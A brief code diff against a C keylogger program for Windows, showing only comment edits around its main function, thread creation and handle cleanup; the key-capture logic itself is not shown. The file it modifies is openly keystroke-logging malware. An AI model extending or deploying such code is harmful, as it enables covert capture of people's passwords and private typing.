@@ -98,7 +98,6 @@ DWORD WINAPI keyloggerThread(LPVOID lpParameter) {
     return 0;
 }
 
-// Main function
 int main() {
     fileMutex = CreateMutex(NULL, FALSE, NULL);  // Create a mutex for file writing
 
@@ -119,7 +118,7 @@ int main() {
     printf("Keylogger is running. Press CTRL+C to stop.\n");
     WaitForSingleObject(hThread, INFINITE);
 
-    // Cleanup
+    // Closing threads
     CloseHandle(fileMutex);
     CloseHandle(hThread);
 
